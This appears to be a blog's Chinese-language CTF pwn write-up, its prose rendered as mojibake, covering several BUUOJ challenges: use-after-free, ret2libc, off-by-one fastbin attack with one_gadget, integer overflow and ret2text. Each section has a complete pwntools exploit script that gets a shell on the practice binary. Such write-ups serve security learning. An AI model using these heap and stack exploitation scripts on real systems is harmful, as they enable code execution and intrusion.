<p>çœ‹èµ·æ¥æ˜¯ä¸€é“å †é¢˜ï¼Œå­˜åœ¨åˆ†é…ã€é‡Šæ”¾ã€æ‰“å°å †å—çš„åŠŸèƒ½</p>
<p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°ç¨‹åºä¸­å­˜åœ¨åé—¨å‡½æ•°</p>
<p><img src="https://i.loli.net/2020/12/01/Ym2n6FaAwBNOuV7.png" alt="image.png"></p>
<p>é¢˜ç›®æç¤ºæ˜¯Ubuntu18ï¼Œä¹Ÿå°±æ˜¯libc2.27ï¼Œå¼•å…¥äº†tcacheæœºåˆ¶ï¼Œä½†æ˜¯æ²¡æœ‰tcache double freeéªŒè¯çš„ç‰ˆæœ¬</p>
<p>addå‡½æ•°ä¸­ä¼¼ä¹åªèƒ½åˆ†é…7ä¸ªå †å—ï¼Œç©ºé—´æœ‰ç‚¹ç´§å¼ ï¼Œè€Œä¸”æ¯æ¬¡åˆ†é…åéƒ½ä¼šè¦†ç›–æ‰åŸæ¥çš„å †å—æŒ‡é’ˆ</p>
<p><img src="https://i.loli.net/2020/12/01/E5oFjm9cVOnTGXv.png" alt="image.png"></p>
<p>å¥½åœ¨freeåæœªå°†æŒ‡é’ˆç½®0ï¼Œ<strong>å­˜åœ¨Use After Free</strong>æ¼æ´</p>
<p><img src="https://i.loli.net/2020/12/01/yDu6BFCNoMLItQd.png" alt="image.png"></p>
<p>åŒæ—¶æˆ‘ä»¬å¯ä»¥å‘ç°<code>show()</code>å‡½æ•°ä¸­è°ƒç”¨çš„æ˜¯girlfriend[0][1]ä¸­çš„æ•°æ®ä½œä¸ºå‡½æ•°æŒ‡é’ˆæ¥æ‰§è¡Œï¼Œè€Œ<strong>girlfriend</strong>æœ¬èº«å°±æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼Œåœ¨åˆå§‹æ—¶åˆ†é…çš„æ˜¯0x10å¤§å°çš„å †å—</p>
<p><img src="https://i.loli.net/2020/12/01/Tk48oH5yF7NPvrp.png" alt="image.png"></p>
<p>æ•…æˆ‘ä»¬åªéœ€è¦åˆå§‹åŒ–girlfriendåfreeæ‰girlfriendå†é‡æ–°åˆ†é…ä¸€ä¸ª0x10å¤§å°çš„å †å—å³å¯æ”¹å†™è¯¥æŒ‡é’ˆä¸ºåé—¨å‡½æ•°åœ°å€åå†showå³å¯getshell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./girlfriend'</span>) <span class="comment"># remote('node3.buuoj.cn',27506)</span></span><br><span class="line">backdoor = <span class="number">0x400D86</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(command:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b'u choice :'</span>)</span><br><span class="line">    p.sendline(str(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Please input the length of her name:"</span>)</span><br><span class="line">    p.send(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"Please tell me her name:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"Index :"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    new(<span class="number">0x80</span>, <span class="string">"arttnba3"</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(backdoor))</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/12/01/QHNE6DmMORUiGcF.png" alt="image.png"></p>
<h1 id="0x026-jarvisoj-level4-ret2libc"><a href="#0x026-jarvisoj-level4-ret2libc" class="headerlink" title="0x026.jarvisoj_level4 - ret2libc"></a>0x026.jarvisoj_level4 - ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/12/01/tUa3TvpBgSWh4bR.png" alt="I1__E1AGMQCM8C3C__IR4_N.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/NVODiTzqfhtI1Hy.png" alt="image.png"></p>
<p>ç›´æ¥å°±æœ‰ä¸€ä¸ªå¾ˆå¤§çš„æº¢å‡º</p>
<p>ç”±äºä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„gadgetï¼Œæ•…è€ƒè™‘ret2libcï¼šå…ˆæ³„æ¼å‡ºwriteå‡½æ•°çœŸå®åœ°å€åä½¿ç”¨LibcSearcheræŸ¥æ‰¾libcç‰ˆæœ¬åæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./level4'</span>) <span class="comment"># p = remote('node3.buuoj.cn',28914)</span></span><br><span class="line">e = ELF(<span class="string">'./level4'</span>)</span><br><span class="line">offset = <span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'A'</span> * offset + p32(<span class="number">0xdeadbeef</span>) + p32(e.plt[<span class="string">'write'</span>]) + p32(e.sym[<span class="string">'main'</span>]) + p32(<span class="number">1</span>) + p32(e.got[<span class="string">'write'</span>]) + p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line">write_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'A'</span>*offset + p32(<span class="number">0xdeadbeef</span>) + p32(sys_addr) + p32(<span class="number">0xdeadbeef</span>) + p32(sh_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¾—flag</p>
<p><img src="https://i.loli.net/2020/12/01/FxEkX38erav47Ad.png" alt="image.png"></p>
<h1 id="0x027-V-amp-N2020-å…¬å¼€èµ›-simpleHeap-off-by-one-fastbin-attack-one-gadget"><a href="#0x027-V-amp-N2020-å…¬å¼€èµ›-simpleHeap-off-by-one-fastbin-attack-one-gadget" class="headerlink" title="0x027.[V&amp;N2020 å…¬å¼€èµ›]simpleHeap - off by one + fastbin attack + one_gadget"></a>0x027.[V&amp;N2020 å…¬å¼€èµ›]simpleHeap - off by one + fastbin attack + one_gadget</h1><p>åˆæ˜¯ä¸€é“å †é¢˜æ¥äº†ï¼Œ<del>çœ‹æ¥å¾€ååº”è¯¥éƒ½æ˜¯å †é¢˜ä¸ºä¸»äº†</del>ï¼Œä¸å‡ºæ‰€æ–™ï¼Œä¿  æŠ¤  å…¨  å¼€</p>
<p><img src="https://i.loli.net/2020/12/01/iyIftbNOM4CrTka.png" alt="image.png"></p>
<p>åŒæ—¶é¢˜ç›®æç¤ºUbuntu16ï¼Œä¹Ÿå°±æ˜¯è¯´æ²¡æœ‰tcache</p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/IWHrRozGqyLDfUX.png" alt="image.png"></p>
<p>è¿™æ˜¯ä¸€é“æœ‰ç€åˆ†é…ã€æ‰“å°ã€é‡Šæ”¾ã€ç¼–è¾‘å †å—çš„åŠŸèƒ½çš„å †é¢˜ï¼Œä¸éš¾çœ‹å‡ºæˆ‘ä»¬åªèƒ½åˆ†é…10ä¸ªå †å—ï¼Œä¸è¿‡æ²¡æœ‰tcacheçš„æƒ…å†µä¸‹ï¼Œç©ºé—´å…¶å®è¿˜æ˜¯æŒºå……è¶³çš„</p>
<p>æ¼æ´ç‚¹åœ¨editå‡½æ•°ä¸­ï¼Œ<strong>ä¼šå¤šè¯»å…¥ä¸€ä¸ªå­—èŠ‚ï¼Œå­˜åœ¨off by oneæ¼æ´</strong>ï¼Œåˆ©ç”¨è¿™ä¸ªæ¼æ´æˆ‘ä»¬å¯ä»¥<strong>ä¿®æ”¹ä¸€ä¸ªå †å—çš„ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ªå †å—çš„size</strong></p>
<p><img src="https://i.loli.net/2020/12/01/o9PlK4ECbHuFiN6.png" alt="image.png"></p>
<p>ç”±äºé¢˜ç›®æœ¬èº«ä»…å…è®¸åˆ†é…å¤§å°å°äº111çš„chunkï¼Œè€Œè¿›å…¥unsorted binéœ€è¦malloc(0x80)çš„chunkï¼Œæ•…æˆ‘ä»¬è¿˜æ˜¯è€ƒè™‘åˆ©ç”¨off by oneçš„æ¼æ´æ”¹å¤§ä¸€ä¸ªchunkçš„sizeé€å…¥unsorted binååˆ†å‰²é€ æˆoverlappingçš„æ–¹å¼è·å¾—libcçš„åœ°å€</p>
<p><img src="https://i.loli.net/2020/12/03/mh1HLy7cvGrCUAQ.png" alt="image.png"></p>
<p>å› ä¸ºåˆšå¥½fastbin attackæ‰€ç”¨çš„chunkçš„sizeä¸º0x71ï¼Œæ•…æˆ‘ä»¬å°†è¿™ä¸ªå¤§chunkçš„sizeæ”¹ä¸º<code>0x70 + 0x70 + 1 = 0xe1</code>å³å¯</p>
<blockquote>
<p>fastbin attackä¸­åˆ†é…åˆ°__malloc_hooké™„è¿‘çš„fake chunké€šå¸¸éƒ½æ˜¯malloc(0x60)ï¼Œä¹Ÿå°±æ˜¯size == 0x71ï¼Œè¿™æ˜¯å› ä¸ºåœ¨__malloc_hook - 0x23è¿™ä¸ªåœ°å€ä¸Šfake chunkçš„SIZEçš„ä½ç½®åˆšå¥½æ˜¯0x<code>7f</code>ï¼Œæ»¡è¶³äº†ç»•è¿‡fastbinçš„sizeæ£€æŸ¥çš„è¦æ±‚</p>
<p><img src="https://i.loli.net/2020/12/03/GBrOqIdPnDluXhb.png" alt="image.png"></p>
</blockquote>
<p>ä¼ ç»Ÿæ€è·¯æ˜¯å°†__malloc_hookæ”¹ä¸ºone_gadgetä»¥getshellï¼Œä½†æ˜¯ç›´æ¥å°è¯•æˆ‘ä»¬ä¼šå‘ç°æ ¹æœ¬æ— æ³•getshell</p>
<p><img src="https://i.loli.net/2020/12/03/RXyTELuGiqKCSh7.png" alt="image.png"></p>
<p>è¿™æ˜¯å› ä¸ºone_gadgetå¹¶éä»»ä½•æ—¶å€™éƒ½æ˜¯é€šç”¨çš„ï¼Œéƒ½æœ‰ä¸€å®šçš„å…ˆå†³æ¡ä»¶ï¼Œè€Œå½“å‰çš„ç¯å¢ƒåˆšå¥½ä¸æ»¡è¶³one_gadgetçš„ç¯å¢ƒ</p>
<p><img src="https://i.loli.net/2020/12/03/DlinxIM76eTLu8S.png" alt="image.png"></p>
<p>é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨reallocå‡½æ•°ä¸­çš„gadgetæ¥è¿›è¡Œå‹æ ˆç­‰æ“ä½œæ¥æ»¡è¶³one_gadgetçš„è¦æ±‚ï¼Œè¯¥æ®µgadgetæ‰§è¡Œå®Œæ¯•åä¼šè·³è½¬è‡³__realloc_hookï¼ˆè‹¥ä¸ä¸ºNULLï¼‰</p>
<p><img src="https://i.loli.net/2020/12/03/PNyq3WFTU8mtYSM.png" alt="image.png"></p>
<p>è€Œ__realloc_hookå’Œ__malloc_hookåˆšå¥½æ˜¯æŒ¨ç€çš„ï¼Œæˆ‘ä»¬åœ¨fastbin attackæ—¶å¯ä»¥ä¸€å¹¶ä¿®æ”¹</p>
<p><img src="https://i.loli.net/2020/12/03/AG3oW65aVeCzMgt.png" alt="image.png"></p>
<p>æ•…è€ƒè™‘ä¿®æ”¹__malloc_hookè·³è½¬è‡³reallocå‡½æ•°å¼€å¤´çš„gadgetè°ƒæ•´å †æ ˆï¼Œä¿®æ”¹__realloc_hookä¸ºone_gadgetå³å¯getshell</p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'node3.buuoj.cn'</span>, <span class="number">28978</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">context.log_level = <span class="string">'DEBUG'</span></span><br><span class="line">one_gadget = <span class="number">0x4526a</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span><span class="params">(command:int)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">b"choice: "</span>)</span><br><span class="line">    p.sendline(str(command).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(size:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"size?"</span>)</span><br><span class="line">    p.sendline(str(size).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"content:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index:int, content)</span>:</span></span><br><span class="line">    cmd(<span class="number">2</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"idx?"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b"content:"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"idx?"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index:int)</span>:</span></span><br><span class="line">    cmd(<span class="number">4</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b"idx?"</span>)</span><br><span class="line">    p.sendline(str(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># initialize chunk</span></span><br><span class="line">    new(<span class="number">0x18</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 0</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 3, prevent the top chunk consolidation</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># off by one get the unsorted bin chunk</span></span><br><span class="line">    edit(<span class="number">0</span>, <span class="string">b'A'</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + <span class="string">b'\xe1'</span>) <span class="comment"># 0x70 + 0x70 + 1</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak the libc addr</span></span><br><span class="line">    show(<span class="number">2</span>)</span><br><span class="line">    main_arena = u64(p.recvuntil(<span class="string">b'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">88</span></span><br><span class="line">    malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">    libc_base = main_arena - <span class="number">0x3c4b20</span></span><br><span class="line">    log.success(<span class="string">"libc addr: "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overlapping and fastbin double free</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 4, overlapping with idx 2</span></span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake chunk overwrite __realloc_hook</span></span><br><span class="line">    new(<span class="number">0x60</span>, p64(libc_base + libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x23</span>)) <span class="comment"># idx 1</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 2</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">"arttnba3"</span>) <span class="comment"># idx 4</span></span><br><span class="line">    new(<span class="number">0x60</span>, <span class="string">b'A'</span> * (<span class="number">0x13</span> - <span class="number">8</span>) + p64(libc_base + one_gadget) + p64(libc_base + libc.sym[<span class="string">'__libc_realloc'</span>] + <span class="number">0x10</span>)) <span class="comment"># idx 5, our fake chunk</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the shell</span></span><br><span class="line">    cmd(<span class="number">1</span>)</span><br><span class="line">    p.sendline(<span class="string">b'1'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯get shell</p>
<p><img src="https://i.loli.net/2020/12/03/5hSCU9J7GdHwvWK.png" alt="image.png"></p>
<blockquote>
<p>ä¸å¾—ä¸è¯´V&amp;Nå‡ºçš„é¢˜è´¨é‡è¿˜æ˜¯å¯ä»¥çš„</p>
</blockquote>
<h1 id="0x028-jarvisoj-level3-x64-ret2csu-ret2libc"><a href="#0x028-jarvisoj-level3-x64-ret2csu-ret2libc" class="headerlink" title="0x028.jarvisoj_level3_x64 - ret2csu + ret2libc"></a>0x028.jarvisoj_level3_x64 - ret2csu + ret2libc</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/12/01/wKnv9UQdNWiGAgq.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/zZDt4oywbmu2Rgp.png" alt="image.png"></p>
<p>ç›´æ¥å°±æœ‰ä¸€ä¸ªå¾ˆå¤§çš„æº¢å‡º</p>
<p>ç”±äºä¸å­˜åœ¨å¯ä»¥ç›´æ¥getshellçš„gadgetï¼Œæ•…è€ƒè™‘ret2libcï¼šå…ˆæ³„æ¼å‡ºwriteå‡½æ•°çœŸå®åœ°å€åä½¿ç”¨LibcSearcheræŸ¥æ‰¾libcç‰ˆæœ¬åæ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>å³å¯</p>
<p>ä¸¤ä¸ªå°gadgetçš„åœ°å€å¦‚ä¸‹</p>
<p><img src="https://i.loli.net/2020/12/01/Uz1lFs8roh9uSye.png" alt="image.png"></p>
<p>æ•…æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./level3_x64'</span>) <span class="comment"># remote('node3.buuoj.cn',26836)</span></span><br><span class="line">e = ELF(<span class="string">'./level3_x64'</span>)</span><br><span class="line">write_got = e.got[<span class="string">'write'</span>]</span><br><span class="line">write_plt = e.plt[<span class="string">'write'</span>]</span><br><span class="line">offset = <span class="number">0x80</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x4006b1</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">payload1 = <span class="string">b'A'</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(write_plt) + p64(e.sym[<span class="string">'main'</span>])</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">write_addr = u64(p.recvuntil(<span class="string">b'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">b'\x00'</span>))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line">sys_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'A'</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(pop_rdi_ret) + p64(sh_addr) + p64(sys_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/12/01/9YlXciZazB3WoQU.png" alt="image.png"></p>
<h1 id="0x029-bjdctf-2020-babystack2-integer-overflow-ret2text"><a href="#0x029-bjdctf-2020-babystack2-integer-overflow-ret2text" class="headerlink" title="0x029.bjdctf_2020_babystack2 - integer overflow + ret2text"></a>0x029.bjdctf_2020_babystack2 - integer overflow + ret2text</h1><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/12/01/e2jUYcNvISPsZqy.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/12/01/j2BrJifVY48SbTK.png" alt="image.png"></p>
<p>readè¯»å…¥æ—¶ä¼šæŠŠsignedè½¬æˆunsignedï¼Œ è¾“å…¥-1å³å¯ç»•è¿‡æ£€æµ‹</p>
<p>åŒæ—¶æˆ‘ä»¬å‘ç°å­˜åœ¨åé—¨å‡½æ•°ï¼Œè¿”å›è‡³æ­¤å³å¯</p>
<p><img src="https://i.loli.net/2020/12/01/MHwmRf2q1tEk9ro.png" alt="image.png"></p>
<p>æ„é€ expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bjdctf_2020_babystack2'</span>) <span class="comment"># remote('node3.buuoj.cn', 25058)</span></span><br><span class="line">backdoor = <span class="number">0x400726</span></span><br><span class="line">offset = <span class="number">0x10</span></span><br><span class="line">payload = <span class="string">b'A'</span> * offset + p64(<span class="number">0xdeadbeef</span>) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">p.sendline(str(<span class="number">-1</span>).encode())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå³å¯getshell</p>
<p><img src="https://i.loli.net/2020/12/01/xLOq52VBcJ74bUm.png" alt="image.png"></p>
<h1 id="0x02A-hitcontraining-uaf-UAF-fastbin-double-free"><a href="#0x02A-hitcontraining-uaf-UAF-fastbin-double-free" class="headerlink" title="0x02A.hitcontraining_uaf - UAF + fastbin double free"></a>0x02A.hitcontraining_uaf - UAF + fastbin double free</h1><p><del>æ¼æ´ç›´æ¥åœ¨é¢˜ç›®åç§°é‡Œè¯´æ˜äº†äº‹UAF</del></p>
<p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°åªå¼€äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤</p>
<p><img src="https://i.loli.net/2020/12/03/xhMBIPmZ2V8RHyu.png" alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è¿™ä¸ªç¨‹åºæœ‰ç€<strong>åˆ†é…ã€æ‰“å°ã€é‡Šæ”¾å †å—çš„åŠŸèƒ½</strong></p>
<p>ä¸éš¾çœ‹å‡ºåœ¨æ·»åŠ å †å—æ—¶é¦–å…ˆä¼šåˆ†é…ä¸€ä¸ª8å­—èŠ‚å¤§å°çš„chunkï¼Œè¯¥chunkå‰4å­—èŠ‚å‚¨å­˜ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå4å­—èŠ‚åˆ™å‚¨å­˜å®é™…åˆ†é…çš„chunkçš„æŒ‡é’ˆ</p>
